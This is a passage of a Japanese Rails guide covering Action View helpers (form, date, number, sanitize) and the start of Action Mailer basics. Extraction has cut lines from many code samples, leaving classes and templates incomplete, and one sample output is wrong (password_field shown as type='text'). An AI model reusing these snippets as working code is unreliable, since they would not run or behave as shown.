たとえば、あるRailsアプリケーション全体にわたって標準のアプリケーションレイアウトを使用しているが、特定のページでのみ特定のJavaScriptコードが必要となり、他のページではこのJavaScriptはまったく不要であるとします。
このようなときには`content_for`を使用します。これにより、そのJavaScriptコードを特定のページにだけインクルードし、サイトの他の部分でインクルードされることのないようにできます。
**app/views/layouts/application.html.erb**
    <%= yield :special_script %>
    <p>Welcome! 
<p>This is a special page.</p>
<% content_for :special_script do %>
  <script>alert('Hello!')
### DateHelper
#### date_select
日付用のselectタグのセットを返します。タグは年・月・日用にそれぞれあり、日付に関する特定の属性にアクセスして年月日を選択済みの状態にします。
#### datetime_select
日付・時刻用のselectタグのセットを返します。タグは年・月・日・時・分用にそれぞれあり、日付・時刻に関する特定の属性にアクセスして日時が選択済みになります。
#### distance_of_time_in_words
TimeオブジェクトやDateオブジェクト、秒を表す整数同士を比較して近似表現を返します。
`include_seconds`をtrueにすると、より詳細な差を得られます。
distance_of_time_in_words(Time.now, Time.now + 15.seconds, include_seconds: true)  # => less than 20 seconds
#### select_date
# 指定された日付 (ここでは本日から6日後) をデフォルト値とする日付セレクトボックスを生成する
select_date(Time.today + 6.days)
# 日付の指定がない場合、本日をデフォルト値とする日付セレクトボックスを生成する
select_date()
#### select_datetime
# 指定された日時 (ここでは本日から4日後) をデフォルト値とする日時セレクトボックスを生成する
select_datetime(Time.now + 4.days)
# 日時の指定がない場合、本日をデフォルト値とする日時セレクトボックスを生成する
select_datetime()
#### select
1から31までの日付をオプションに持ち、当日が選択されているselectタグを返します。
# 指定された日付をデフォルト値に持つセレクトボックスを生成する
# 指定された数値をデフォルトの日付として持つセレクトボックスを生成する
0から23までの時をオプションに持ち、現在時刻が選択されているselectタグを返します。
# 指定された分をデフォルト値として持つセレクトボックスを生成する
JanuaryからDecemberまでの月をオプションに持ち、現在の月が選択されているselectタグを返します(訳注: 日本語環境では1月から12月が表示されます)。
# 現在の月をデフォルト値に持つセレクトボックスを生成する
0から59までの秒をオプションに持ち、現在時刻の秒が選択されているselectタグを返します。
# 現在時刻をデフォルト値に持つ時刻セレクトボックスを生成する
`:start_year`キーと`:end_year`キーを`options`に設定することで、デフォルトの5年を変更できます。
# 今年をデフォルト値に持ち、Date.todayで得られた日の前後5年をオプションに持つセレクトボックスを生成する
# 今年をデフォルト値に持ち、1900年から2009年までをオプションに持つセレクトボックスを生成する
`distance_of_time_in_words`と基本的に同じ動作であり、`to_time`の部分が`Time.now`に固定されている点だけが異なります。
時刻用のselectタグのセットを返します。タグは時・分用の他にオプションで秒もあります。時刻に関する特定の属性にアクセスして日時が選択済みになります。
このタグで選択された項目は、Active Recordオブジェクトにマルチパラメータとして割り当て可能な形式になります。
# 時刻選択用タグを作成する。フォームがPOSTされると、submitted属性のorder変数が保存される。
YAMLからダンプしたオブジェクトを含む`pre`タグを返します。
my_hash = {'first' => 1, 'second' => 'two', 'third' => [1,2,3]}
debug(my_hash)
<pre class='debug_dump'>---
first: 1
second: two
third:
</pre>
### FormHelper
フォームヘルパーを使用すると、標準のHTML要素だけを使用するよりもはるかに容易に、モデルと連携動作するフォームを作成することができます。
Formヘルパーはフォーム用のHTMLを生成し、テキストやパスワードといった入力の種類に応じたメソッドを提供します。
(送信ボタンがクリックされたり、JavaScriptでform.submitを呼び出すなどして) フォームが送信されると、フォームの入力内容はparamsオブジェクトにまとめて保存され、コントローラに渡されます。
フォームヘルパーは、モデル属性の操作に特化したものと、より一般的なものの2種類に分類できます。
ここではモデル属性の扱いに特化したものについて説明します。モデル属性に特化していない一般的なフォームヘルパーについては、ActionView::Helpers::FormTagHelperのドキュメントを参照してください。
ここで扱うフォームヘルパーの中心となるメソッドはform_forです。このメソッドはモデルのインスタンスからフォームを作成することができます。たとえば、以下のようにPersonというモデルがあり、このモデルをもとにしてインスタンスを1つ作成するとします。
# メモ: a @person変数はコントローラ側で設定済みであるとする (@person = Person.newなど)
<%= form_for @person, url: {action: "create"} do |f| %>
  <%= f.text_field :first_name %>
  <%= f.text_field :last_name %>
  <%= submit_tag 'Create' %>
上のコードによって生成されるHTMLは以下のようになります
<form action="/people/create" method="post">
  <input id="person_first_name" name="person[first_name]" type="text" />
  <input id="person_last_name" name="person[last_name]" type="text" />
  <input name="commit" type="submit" value="Create" />
上のフォームが送信される時に作成されるparamsオブジェクトは以下のようになります。
{"action" => "create", "controller" => "people", "person" => {"first_name" => "William", "last_name" => "Smith"}}
上のparamsハッシュには、Personモデル用の値がネストした形で含まれているので、コントローラで`params[:person]`と書くことで内容にアクセスできます。
#### check_box
指定された属性にアクセスするためのチェックボックスタグを生成します。
#### fields_for
form_forのような特定のモデルオブジェクトの外側にスコープを作成しますが、フォームタグ自体は作成しません。
このため、fields_forは同じフォームに別のモデルオブジェクトを追加するのに向いています。
<%= form_for @person, url: {action: "update"} do |person_form| %>
  First name: <%= person_form.text_field :first_name %> 
  Last name : <%= person_form.text_field :last_name %>
  <%= fields_for @person.permission do |permission_fields| %>
    Admin?  : <%= permission_fields.check_box :admin %>
#### file_field
特定の属性にアクセスするための、ファイルアップロード用inputタグを返します。
file_field(:user, :avatar)
# => <input type="file" id="user_avatar" name="user[avatar]" />
#### form_for
フィールドにどのような値があるかを問い合わせるのに使用される、特定のモデルオブジェクトの外側にフォームを1つとスコープを1つ作成します。
  <%= f.label :title, 'Title' %>:
  <%= f.text_field :title %><br>
  <%= f.label :body, 'Body' %>:
  <%= f.text_area :body %><br>
#### hidden_field
特定の属性にアクセスするための、隠されたinputタグを返します。
hidden_field(:user, :token)
# => <input type="hidden" id="user_token" name="user[token]" value="#{@user.token}" />
#### label
特定の属性用のinputフィールドに与えるラベルを返します。
#### password_field
特定の属性にアクセスするための、種類が"password"のinputタグを返します。
password_field(:login, :pass)
# => <input type="text" id="login_pass" name="login[pass]" value="#{@login.pass}" />
#### radio_button
特定の属性にアクセスするためのラジオボタンタグを返します。
#### text_area
特定の属性にアクセスするための、テキストエリア用開始タグと終了タグを返します。
text_area(:comment, :text, size: "20x30")
# => <textarea cols="20" rows="30" id="comment_text" name="comment[text]">
#      #{@comment.text}
#    </textarea>
#### text_field
特定の属性にアクセスするための、種類が"text"のinputタグを返します。
#### email_field
特定の属性にアクセスするための、種類が"email"のinputタグを返します。
email_field(:user, :email)
# => <input type="email" id="user_email" name="user[email]" value="#{@user.email}" />
#### url_field
特定の属性にアクセスするための、種類が"url"のinputタグを返します。
url_field(:user, :url)
# => <input type="url" id="user_url" name="user[url]" value="#{@user.url}" />
### FormOptionsHelper
さまざまな種類のコンテナを1つのオプションタグのセットにまとめるためのメソッドを多数提供します。
#### collection_select
`select`タグと、`object`が属するクラスのメソッド値の既存の戻り値をコレクションにした`option`タグを返します。
例として、このメソッドを適用するオブジェクトの構造が以下のようになっているとします。
class A
  belongs_to :author
class Author < ActiveRecord::Base
  def name_with_initial
    "#{first_name.first}. #{last_name}"
  <option value="">Please select</option>
  <option value="1" selected="selected">D. Heinemeier Hansson</option>
  <option value="2">D. Thomas</option>
  <option value="3">M. Clark</option>
</select>
#### collection_radio_buttons
`object`が属するクラスのメソッド値の既存の戻り値をコレクションにした`radio_button`タグを返します。
#### collection_check_boxes
`object`が属するクラスのメソッド値の既存の戻り値をコレクションにした`check_box`タグを返します。
  has_and_belongs_to_many :authors
#### option_groups_from_collection_for_select
`option`タグの文字列を返します。後述の`options_from_collection_for_select`と似ていますが、引数のオブジェクトリレーションに基いて`optgroup`タグを使用する点が異なります。
class Continent < ActiveRecord::Base
  has_many :countries
  # attribs: id, name
class Country < ActiveRecord::Base
  belongs_to :continent
  # attribs: id, name, continent_id
使用例は以下のようになります。
option_groups_from_collection_for_select(@continents, :countries, :name, :id, :name, 3)
出力結果は以下のようになります。
<optgroup label="Africa">
  <option value="1">Egypt</option>
  <option value="4">Rwanda</option>
</optgroup>
<optgroup label="Asia">
  <option value="3" selected="selected">China</option>
  <option value="12">India</option>
  <option value="5">Japan</option>
NOTE: 返されるのは`optgroup`タグと`option`だけです。従って、出力結果の外側を適切な`select`タグで囲む必要があります。
#### options_for_select
コンテナ (ハッシュ、配列、enumerable、独自の型) を引数として受け付け、オプションタグの文字列を返します。
options_for_select([ "VISA", "MasterCard" ])
# => <option>VISA</option> <option>MasterCard</option>
NOTE: 返されるのは`option`だけです。従って、出力結果の外側を適切なHTML `select`タグで囲む必要があります。
#### options_from_collection_for_select
`collection`を列挙した結果をoptionタグ化した文字列を返し、呼び出しの結果を`value_method`にオプション値として割り当て、`text_method`にオプションテキストとして割り当てます。
options_from_collection_for_select(collection, value_method, text_method, selected = nil)
たとえば、@project.peopleに入っているpersonをループですべて列挙してinputタグを作成するのであれば、以下のようになります。
options_from_collection_for_select(@project.people, "id", "name")
# => <option value="#{person.id}">#{person.name}</option>
指定されたオブジェクトとメソッドに従って、selectタグの中に一連のoptionタグを含んだものを作成します。
  <option value=""></option>
  <option value="1" selected="selected">David</option>
  <option value="2">Sam</option>
  <option value="3">Tobias</option>
#### time_zone_options_for_select
世界のほぼすべてのタイムゾーンを含むオプションタグの文字列を返します。
#### time_zone_select
time_zone_options_for_selectを使用してオプションタグを生成し、指定されたオブジェクトとメソッド用のselectタグとoptionタグを返します。
time_zone_select( "user", "time_zone")
#### date_field
特定の属性にアクセスするための、種類が"date"のinputタグを返します。
date_field("user", "dob")
### FormTagHelper
フォームタグを作成するためのメソッドを多数提供します。これらのメソッドは、テンプレートに割り当てられているActive Recordオブジェクトに依存しない点がFormHelperと異なります。
その代わり、FormTagHelperのメソッドでは名前と値を個別に指定します。
#### check_box_tag
チェックボックス用のフォームinputタグを作成します。
check_box_tag 'accept'
# => <input id="accept" name="accept" type="checkbox" value="1" />
#### field_set_tag
HTMLフォーム要素をグループ化するためのfieldsetタグを作成します。
<%= field_set_tag do %>
  <p><%= text_field_tag 'name' %></p>
# => <fieldset><p><input id="name" name="name" type="text" /></p></fieldset>
#### file_field_tag
ファイルアップロード用のフィールドを作成します。
<%= form_tag({action:"post"}, multipart: true) do %>
  <label for="file">File to Upload</label> <%= file_field_tag "file" %>
  <%= submit_tag %>
出力例:
file_field_tag 'attachment'
# => <input id="attachment" name="attachment" type="file" />
#### form_tag
`url_for_options`で設定されたURLへのアクションに送信されるフォームタグを作成します。これは`ActionController::Base#url_for`と似ています。
  <div><%= submit_tag 'Save' %></div>
#### hidden_field_tag
フォームinputの「隠しフィールド」を作成します。この隠しフィールドは、通常であればHTTPがステートレスであることによって失われる可能性のあるデータを送信したり、ユーザーから見えないようにしておきたいデータを送信するのに使用されます。
hidden_field_tag 'token', 'VUBJKB23UIVI1UU1VOBVI@'
# => <input id="token" name="token" type="hidden" value="VUBJKB23UIVI1UU1VOBVI@" />
#### image_submit_tag
送信画像を表示します。この画像をクリックするとフォームが送信されます。
image_submit_tag("login.png")
# => <input src="/images/login.png" type="image" />
#### label_tag
フィールドのラベルを作成します。
label_tag 'name'
# => <label for="name">Name</label>
#### password_field_tag
パスワード用のフィールドを作成します。このフィールドへの入力はマスク用文字で隠されます。
password_field_tag 'pass'
# => <input id="pass" name="pass" type="password" />
#### radio_button_tag
ラジオボタンを作成します。ユーザーが同じオプショングループ内から選択できるよう、同じname属性でラジオボタンをグループ化してください。
radio_button_tag 'gender', 'male'
# => <input id="gender_male" name="gender" type="radio" value="male" />
#### select_tag
ドロップダウン選択ボックスを作成します。
select_tag "people", "<option>David</option>"
# => <select id="people" name="people"><option>David</option></select>
#### submit_tag
キャプションとして指定されたテキストを使用して送信ボタンを作成します。
#### text_area_tag
textareaタグでテキスト入力エリアを作成します。ブログへの投稿や説明文などの長いテキストを入力するにはtextareaをご使用ください。
#### text_field_tag
通常のテキストフィールドを作成します。ユーザー名や検索キーワード入力用のフィールドにはこの通常のテキストフィールドをご使用ください。
text_field_tag 'name'
# => <input id="name" name="name" type="text" />
#### email_field_tag
種類が`email`の標準入力フィールドを作成します。
email_field_tag 'email'
# => <input id="email" name="email" type="email" />
#### url_field_tag
種類が`url`の標準入力フィールドを作成します。
url_field_tag 'url'
# => <input id="url" name="url" type="url" />
#### date_field_tag
種類が`date`の標準入力フィールドを作成します。
date_field_tag "dob"
# => <input id="dob" name="dob" type="date" />
### JavaScriptHelper
ビューでJavaScriptを使用するための機能を提供します。
#### escape_javascript
JavaScriptセグメントから改行 (CR) と一重引用符と二重引用符をエスケープします。
#### javascript_tag
渡されたコードをJavaScript用タグにラップして返します。
javascript_tag "alert('All is good')"
<script>
alert('All is good')
//]]>
</script>
### NumberHelper
数値をフォーマット済み文字列に変換するメソッド群を提供します。
サポートされているフォーマットは電話番号、通貨、パーセント、精度、座標、ファイルサイズなどです。
#### number_to_currency
数値を通貨表示に変換します ($13.65など)。
number_to_currency(1234567890.50) # => $1,234,567,890.50
#### number_to_human_size
バイト数を読みやすい形式にフォーマットします。ファイルサイズをユーザーに表示する場合に便利です。
number_to_human_size(1234)          # => 1.2 KB
number_to_human_size(1234567)       # => 1.2 MB
#### number_to_percentage
数値をパーセント文字列に変換します。
number_to_percentage(100, precision: 0)        # => 100%
#### number_to_phone
数値を米国式の電話番号に変換します。
number_to_phone(1235551234) # => 123-555-1234
#### number_with_delimiter
数値に3桁ごとの桁区切り文字を追加します。
number_with_delimiter(12345678) # => 12,345,678
#### number_with_precision
数値を指定された精度(`precision`)に変換します。デフォルトの精度は3です。
number_with_precision(111.2345)     # => 111.235
number_with_precision(111.2345, 2)  # => 111.23
### SanitizeHelper
SanitizeHelperモジュールは、望ましくないHTML要素を除去するためのメソッド群を提供します。
#### sanitize
sanitize @article.body
:attributesオプションまたは:tagsオプションが渡されると、そこで指定されたタグおよび属性のみが処理の対象外となります。
sanitize @article.body, tags: %w(table tr td), attributes: %w(id class style)
さまざまな用途に合わせてデフォルト設定を変更できます。たとえば以下のようにデフォルトのタグにtableタグを追加するとします。
class Application < Rails::Application
  config.action_view.sanitized_allowed_tags = 'table', 'tr', 'td'
#### sanitize_css(style)
CSSコードをサニタイズします。
#### strip_links(html)
リンクテキストを残してリンクタグをすべて削除します。
strip_links("<a href="http://rubyonrails.org">Ruby on Rails</a>")
# => Ruby on Rails
strip_links("emails to <a href="mailto:me@email.com">me@email.com</a>.")
# => emails to me@email.com.
strip_links('Blog: <a href="http://myblog.com/">Visit</a>.')
# => Blog: Visit.
#### strip_tags(html)
HTMLからHTMLタグをすべて削除します。HTMLコメントも削除されます。
このメソッドではHTMLスキャナとHTMLトークナイザ (tokenizer) を使用しており、HTMLの解析能力はスキャナの能力に依存しています。
strip_tags("Strip <i>these</i> tags!")
# => Strip these tags!
strip_tags("<b>Bold</b> no more!  
<a href='more.html'>See more</a>")
# => Bold no more!  
See more
CAUTION: この出力にはエスケープされていない'<'、'>'、'&'文字が残ることがあり、それによってブラウザが期待どおりに動作しなくなることがあります。
### CsrfHelper
"csrf-param"メタタグと"csrf-token"メタタグを返します。これらの名称はそれぞれ、クロスサイトリクエストフォージェリ (CSRF: cross-site request foregery) のパラメータとトークンが元になっています。
<%= csrf_meta_tags %>
NOTE: 通常のフォームではそのための隠しフィールドが生成されるので、これらのタグは使用されません。
ローカライズされたビュー
Action Viewは、現在のロケールに応じてさまざまなテンプレートを出力することができます。
I18n.locale = :de
ローカライズ版のテンプレートが見当たらない場合は、装飾なしのバージョンが使用されます。
つまり、ローカライズ版ビューがなくても動作しますが、ローカライズ版ビューがあればそれが使用されます。
同じ要領で、publicディレクトリのレスキューファイル (いわゆるエラーページ) もローカライズできます。
たとえば、`I18n.locale = :de`と設定し、`public/500.de.html`と`public/404.de.html`を作成することで、ローカライズ版のレスキューページを作成できます。
RailsはI18n.localeに設定できるシンボルを制限していないので、ローカライズにかぎらず、あらゆる状況に合わせて異なるコンテンツを表示し分けるようにすることができます。
たとえば、エキスパートユーザーには、通常ユーザーと異なる画面を表示したいとします。
これを行なうには、`app/controllers/application.rb`に以下のように追記します。
before_action :set_expert_locale
def set_expert_locale
  I18n.locale = :expert if current_user.expert?
詳細については、[Rails国際化 (I18n) API](i18n.html) を参照してください。
Active Support
-------
Action View
  date:
Railties
Action Mailer の基礎
本章では、アプリケーションでメールの送受信を行えるようにするために必要なすべての事項と、Action Mailerのさまざまな内部情報を提供します。
また、メイラーのテスト方法についても説明します。
* Railsアプリケーションでメールを送受信する方法
* Action Mailerクラスとメイラービューの生成および編集方法
* 環境に合わせてAction Mailerを設定する方法
* Action Mailerクラスのテスト方法
Action Mailerを使用することで、アプリケーションのメイラークラスやビューでメールを送信することができます。
メイラーの動作はコントローラときわめて似通っています。
メイラーは`ActionMailer::Base`を継承し、`app/mailers`に配置され、`app/views`にあるビューと結び付けられます。
メールを送信する
このセクションでは、メイラーとビューの作成方法を手順を追って説明します。
### メイラー生成の全手順
#### メイラーを作成する
$ bin/rails generate mailer UserMailer
create  app/mailers/user_mailer.rb
create  app/mailers/application_mailer.rb
invoke  erb
create    app/views/user_mailer
create    app/views/layouts/mailer.text.erb
create    app/views/layouts/mailer.html.erb
invoke  test_unit
create    test/mailers/user_mailer_test.rb
create    test/mailers/previews/user_mailer_preview.rb
# app/mailers/application_mailer.rb
class ApplicationMailer < ActionMailer::Base
  default from: "from@example.com"
  layout 'mailer'
# app/mailers/user_mailer.rb
class UserMailer < ApplicationMailer
上に示したとおり、Railsの他のジェネレータ同様の方法でメイラーを生成できます。
メイラーは概念上コントローラと似通っており、メイラーを生成すると (コントローラと同様に) ビューのディレクトリとテストも同時に生成されます。
ジェネレータを使用したくない場合は、app/mailersディレクトリ以下にファイルを作成し、`ActionMailer::Base`を継承してください。
class MyMailer < ActionMailer::Base
#### メイラーを編集する
メイラーはRailsのコントローラと非常に似通っています。
メイラーには「アクション」と呼ばれるメソッドがあり、メールのコンテンツを構成するのにビューを使用します。
コントローラでHTMLなどのメールコンテンツを生成して顧客に送信したい場合、その箇所でメイラーを使用して、送信したいメッセージを作成します。
`app/mailers/user_mailer.rb`には空のメイラーがあります。
`welcome_email`という名前のメソッドを追加し、ユーザーが登録したメールアドレスにメールを送信できるようにしてみましょう。
  default from: 'notifications@example.com'
  def welcome_email(user)
    @user = user
    @url  = 'http://example.com/login'
    mail(to: @user.email, subject: 'Welcome to My Awesome Site')
上のメソッドで使用されている項目について簡単に説明します。
利用可能なすべてのオプションについては、「Action Mailerの全メソッド」セクションでユーザー設定可能な属性を参照してください。
* `default Hash` - メイラーから送信するあらゆるメールで使用されるデフォルト値のハッシュです。
上の例の場合、`:from`ヘッダーにこのクラスのすべてのメッセージで使用する値を1つ設定しています。
この値はメールごとに上書きすることもできます。
* `mail` - 実際のメール・メッセージです。ここでは`:to`ヘッダーと`:subject`ヘッダーを渡しています。
コントローラの場合と同様、メイラーのメソッド内で定義されたすべてのインスタンス変数はそのままビューで使用できます。
#### メイラービューを作成する
`app/views/user_mailer/`ディレクトリで`welcome_email.html.erb`というファイルを1つ作成してください。
このファイルを、HTMLでフォーマットされたメールテンプレートにします。
DOCTYPE html>
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
    <h1><%= @user.name %>様、example.comへようこそ。</h1>
      <p>
      example.comへのサインアップが成功しました。
      your username is: <%= @user.login %>.<br>
    </p>
      このサイトにログインするには、<%= @url %>をクリックしてください。
    <p>ご入会ありがとうございます。どうぞお楽しみくださいませ。
続いて、同じ内容のテキストメールも作成しましょう。
顧客によってはHTMLフォーマットのメールを受け取りたくない人もいるので、テキストメールも作成しておくのが最善です。
これを行なうには、`app/views/user_mailer/`ディレクトリで`welcome_email.text.erb`というファイルを以下の内容で作成してください。
<%= @user.name %>様、example.comへようこそ。
===============================================
example.comへのサインアップが成功しました。ユーザー名は「<%= @user.login %>」です。
このサイトにログインするには、<%= @url %>をクリックしてください。
本サイトにユーザー登録いただきありがとうございます。
現在のAction Mailerでは、`mail`メソッドを呼び出すと2種類のテンプレート (テキストおよびHTML) があるかどうかを探し、`multipart/alternative`形式のメールを自動生成します。
#### メイラーを呼び出す
Railsのメイラーは、ビューのレンダリングと本質的に同じことを行っています。
ビューのレンダリングではHTTPプロトコルとして送信されますが、メイラーではメールのプロトコルを経由して送信する点のみが異なります。
従って、ユーザー作成に成功したときにメールを送信するようコントローラからメイラーに指示するだけで機能するようになります。
メイラー呼び出しは非常に簡単です。
例として、最初にscaffoldで`User`を作成してみましょう。
$ bin/rails generate scaffold user name email login
$ bin/rake db:migrate
説明用のユーザーモデルを作成したので、続いて`app/controllers/users_controller.rb`を編集し、新規ユーザーの保存成功直後に`UserMailer`の`UserMailer.welcome_email`を使用してそのユーザーにメールが送信されるようにしましょう。
Action MailerはActive Jobとうまく統合されているので、Webのリクエスト/レスポンスサイクルの外で非同期にメールを送信できます。このおかげで、ユーザーは送信完了を待つ必要がありません。
  # POST /users
  # POST /users.json
        # 保存後にUserMailerを使用してwelcomeメールを送信
        UserMailer.welcome_email(@user).deliver_later
        format.html { redirect_to(@user, notice: 'ユーザーが正常に作成されました。') 
        format.html { render action: 'new' }
NOTE: Active Jobはデフォルトでジョブを':inline'で実行します。
したがって、この時点で`deliver_later`を使用してメールを送信できます。また、メールを後でバックグラウンドジョブから送信したい場合は、SidekiqやResqueなどのバックエンドクエリシステムを使用するようActive Jobを設定するだけで済みます。
メールをcronjobなどから今すぐ送信したい場合は、`deliver_now`を呼び出すだけで済みます。
class SendWeeklySummary
  def run
    User.find_each do |user|
      UserMailer.weekly_summary(user).deliver_now
この`welcome_email`メソッドは`ActionMailer::MessageDelivery`オブジェクトを1つ返します。このオブジェクトは、そのメール自身が送信対象であることを`deliver_now`や`deliver_later`に伝えます。
`ActionMailer::MessageDelivery`オブジェクトは、`Mail::Message`をラップしています。
内部の`Mail::Message`オブジェクトの表示や変更などを行いたい場合は、`ActionMailer::MessageDelivery`オブジェクトの`message`メソッドにアクセスします。
### ヘッダーの値を自動エンコードする
Action Mailerは、メールのヘッダーや本文のマルチバイト文字を自動的にエンコードします。
別の文字セットを定義したい場合や、事前に手動で別のエンコードを行っておきたい場合などの複雑な事例については、[Mail](https://github.com/mikel/mail)ライブラリを参照してください。
### Action Mailerの全メソッド
以下の3つのメソッドを使用すれば、ほとんどのメール送信をカバーできます。
* `headers` - メールに追加したいヘッダーを指定します。
メールヘッダーのフィールド名と値のペアをハッシュにまとめて渡すこともできますし、`headers[:field_name] = 'value'`のように呼び出すこともできます。
* `attachments` - メールにファイルを添付します。
`attachments['file-name.jpg'] = File.read('file-name.jpg')`のように記述します。
* `mail` - 実際のメール自身を送信します。
このメソッドにはヘッダーのハッシュをパラメータとして渡すことができます。メソッドを呼び出すと、定義しておいたメールテンプレートに応じて、プレーンテキストメールまたはマルチパートメールを送信します。
#### ファイルを添付する
Action Mailerではファイルを簡単に添付できます。
* ファイル名とコンテンツを渡すと、Action Mailerと[Mail gem](https://github.com/mikel/mail)が自動的にmime_typeを推測し、エンコードを設定してファイルを添付します。
    attachments['filename.jpg'] = File.read('/path/to/filename.jpg')
  `mail`メソッドをトリガーすると、マルチパート形式のメールが1つ送信されます。送信されるメールは、トップレベルが`multipart/mixed`で最初のパートが`multipart/alternative`という正しい形式でネストしている、プレーンテキストメールまたはHTMLメールです。
NOTE: メールに添付されるファイルは自動的にBase64でエンコードされます。
他のエンコードを使用したい場合、事前に好みのエンコードを適用したコンテンツを`Hash`でエンコードしてから`attachments`に渡します。
* ヘッダーとコンテンツを指定してファイル名を渡すと、それらの設定がAction MailerとMailによって使用されます。
    encoded_content = SpecialEncode(File.read('/path/to/filename.jpg'))
    attachments['filename.jpg'] = {
      mime_type: 'application/x-gzip',
      encoding: 'SpecialEncoding',
      content: encoded_content
NOTE: エンコーディングの種類を指定すると、Mailはコンテンツが既にエンコード済みであると判断し、Base64によるエンコードを行いません。
#### ファイルをインラインで添付する
Action Mailer 3.0はファイルをインライン添付できます。この機能は3.0より前に行われた多数のハックを基に、理想に近づけるべくシンプルな実装にしたものです。
* インライン添付を使用することをMailに指示するには、Mailer内のattachmentsメソッドに対して`#inline`を呼び出すだけで済みます。
    def welcome
      attachments.inline['image.jpg'] = File.read('/path/to/image.jpg')
* 続いて、ビューで`attachments`をハッシュとして参照し、表示したい添付ファイルを指定することができます。これを行なうには、`attachments`に対して`url`を呼び出し、その結果を`image_tag`メソッドに渡します。
    ```html+erb
    <p>こんにちは、以下の写真です。</p>
    <%= image_tag attachments['image.jpg'].url %>
* これは`image_tag`に対する標準的な呼び出しであるため、画像ファイルを扱う時と同様、添付URLの後にもオプションのハッシュを1つ置くことができます。
    <%= image_tag attachments['image.jpg'].url, alt: 'My Photo', class: 'photos' %>
#### メールを複数の相手に送信する
1つのメールを複数の相手に送信することももちろん可能です (サインアップが新規に行われたことを全管理者に通知するなど)。これを行なうには、メールのリストを`:to`キーに設定します。
メールのリストの形式は、メールアドレスの配列でも、メールアドレスをカンマで区切った文字列でも構いません。
class AdminMailer < ActionMailer::Base
  default to: Proc.new { Admin.pluck(:email) },
          from: 'notification@example.com'
  def new_registration(user)
    mail(subject: "New User Signup: #{@user.email}")
CC (カーボンコピー) やBCC (ブラインドカーボンコピー) アドレスを指定する場合にも同じ形式を使用できます。それぞれ`:cc`キーと`:bcc`キーを使用します。
#### メールアドレスを名前で表示する
受信者のメールアドレスをメールにそのまま表示するのではなく、受信者の名前で表示したいことがあります。
これを行なうには、メールアドレスを`"フルネーム <メールアドレス>"`の形式で指定します。
def welcome_email(user)
  @user = user
  email_with_name = %("#{@user.name}" <#{@user.email}>)
  mail(to: email_with_name, subject: 'Welcome to My Awesome Site')
### メイラーのビュー
メイラーのビューは`app/views/name_of_mailer_class`ディレクトリに置かれます。
個別のメイラービューは、その名前がメイラーメソッドと同じになるので、クラスから認識できます。
先の例の場合、`welcome_email`メソッドで使用するメイラービューは、HTML版であれば`app/views/user_mailer/welcome_email.html.erb`が使用され、プレーンテキストであれば`welcome_email.text.erb`が使用されます。
アクションで使用するデフォルトのメイラービューを変更するには、たとえば以下のようにします。
    mail(to: @user.email,
         subject: 'Welcome to My Awesome Site',
         template_path: 'notifications',
         template_name: 'another')
上のコードは、`another`という名前のテンプレートを`app/views/notifications`ディレクトリ以下から探索します。
`template_path`にはパスの配列を指定することもできます。この場合探索は配列順に沿って行われます。
より柔軟性の高い方法を使用したい場合は、ブロックを1つ渡して特定のテンプレートをレンダリングしたり、テンプレートを使用せずにインラインまたはテキストでレンダリングすることもできます。
         subject: 'Welcome to My Awesome Site') do |format|
      format.html { render 'another_template' }
      format.text { render text: 'Render text' }
上のコードは、HTMLの部分を'another_template.html.erb'テンプレートを使用してレンダリングし、テキスト部分を`:text`でレンダリングしています。
レンダリングのコマンドはAction Controllerで使用されているものと同じなので、`:text`、`:inline`などのオプションもすべて同様に使用できます。
### Action Mailerのレイアウト
メイラーもコントローラのビューと同様の方法でレイアウトを設定できます。
メイラーで使用するレイアウト名はメイラーと同じ名前である必要があります。たとえば、`user_mailer.html.erb`や`user_mailer.text.erb`というレイアウトは自動的にメイラーでレイアウトとして認識されます。
別のレイアウトファイルを明示的に指定したい場合は、メイラーで`layout`を呼び出します。
  layout 'awesome' # awesome.(html|text).erbをレイアウトとして使用する
コントローラのビューと同様に、`yield`を使用してレイアウト内のビューをレンダリングできます。
formatブロック内でrenderメソッド呼び出しに`layout: 'layout_name'`オプションを渡すことで、フォーマットごとに異なるレイアウトを指定することもできます。
    mail(to: user.email) do |format|
      format.html { render layout: 'my_layout' }
      format.text
上のコードは、HTMLの部分については`my_layout.html.erb`レイアウトファイルを明示的に使用してレンダリングし、テキストの部分については通常の`user_mailer.text.erb`があればそれを使用してレンダリングします。
### Action MailerのビューでURLを生成する
メイラーがコントローラと異なる点のひとつは、メイラーのインスタンスはサーバーに届くHTTPリクエストのコンテキストと無関係であることです。アプリケーションのホスト情報をメイラー内で使用したい場合は`:host`パラメータを明示的に指定します。
`:host`に指定する値はそのアプリケーション内で共通であるのが普通なので、`config/application.rb`に以下の記述を追加してグローバルに利用できるようにします。
config.action_mailer.default_url_options = { host: 'example.com' }
`*_path`ヘルパーは、動作の性質上メール内では一切使用できない点にご注意ください。
メールでURLが必要な場合は`*_url`ヘルパーを使用してください。
以下に例を示します。
<%= link_to 'ようこそ', welcome_path %>
上のコードの代りに、以下のコードを使用する必要があります。
<%= link_to 'ようこそ', welcome_url %>
こうすることでフルパスのURLが引用され、メールのURLが正常に機能するようになります。
#### `url_for`を使用してURLを生成する
`:host`オプションをグローバルに設定していない場合は、`url_for`に`:host`オプションを明示的に渡す必要があることにご注意ください。
<%= url_for(host: 'example.com',
            controller: 'welcome',
            action: 'greeting') %>
#### 名前付きルーティングを使用してURLを生成する
メールクライアントはWebサーバーのコンテキストから切り離されているので、メールに記載するパスではWebのアドレスのベースURLは補完されません。
従って、名前付きルーティングヘルパーについても "*_path" ではなく "*_url" を使用する必要があります。
`:host`オプションをグローバルに設定していない場合は、"*_url" ヘルパーに`:host`オプションを明示的に渡す必要があることにご注意ください。
<%= user_url(@user, host: 'example.com') %>
### マルチパートメールを送信する
あるアクションに複数の異なるテンプレートがあると、Action Mailerによって自動的にマルチパート形式のメールが送信されます。
UserMailerを例にとって説明します。`app/views/user_mailer`ディレクトリに`welcome_email.text.erb`と`welcome_email.html.erb`というテンプレートがあると、Action MailerはそれぞれのテンプレートからHTMLメールとテキストメールを生成し、マルチパート形式のメールとしてひとつにまとめて自動的に送信します。
マルチパートメールに挿入されるパートの順序は`ActionMailer::Base.default`メソッドの`:parts_order`によって決まります。
### メール送信時に配信オプションを動的に変更する
SMTP認証情報などのデフォルトの配信オプションをメール配信時に上書きしたい場合、メイラーのアクションで`delivery_method_options`を使用して変更することができます。
  def welcome_email(user, company)
    @url  = user_url(@user)
    delivery_options = { user_name: company.smtp_user,
                         password: company.smtp_password,
                         address: company.smtp_host }
         subject: "添付の利用規約を参照してください", 
